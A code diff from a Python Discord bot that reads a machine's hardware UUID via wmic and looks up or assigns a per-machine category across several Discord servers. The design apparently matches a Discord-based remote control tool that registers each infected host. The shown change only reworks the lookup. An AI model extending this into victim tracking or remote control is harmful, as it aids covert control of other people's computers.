@@ -42,25 +42,30 @@ async def on_ready():
     guild_id = guild_ids[guild_id_index]
 
     hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
+    category_not_found = True
     break_loop = False
     for _ in guild_ids:
-        print(guild_ids[guild_id_index])
         for category_name in client.get_guild(guild_id).categories:
             if hwid in str(category_name):
                 first_run, category = False, category_name
                 category_not_found = False
                 break_loop = True
                 break
-            else: category_not_found = True
-        if category_not_found:
-            get_guild = client.get_guild(guild_id)
-            channel_count = len(get_guild.channels)
-            if channel_count > 495:
-                guild_id_index = guild_id_index + 1
-                guild_id = guild_ids[guild_id_index]
-            else: break
         if break_loop:
             break
+        elif not guild_id_index == len(guild_ids) - 1:
+            guild_id_index = guild_id_index + 1
+            guild_id = guild_ids[guild_id_index]
+        else: break
+            
+
+    if category_not_found:
+        for i in guild_ids:
+            get_guild = client.get_guild(i)
+            channel_count = len(get_guild.channels)
+            if not channel_count > 495:
+                guild_id = i
+                break
     
     if not first_run:
         category_channel_names = []
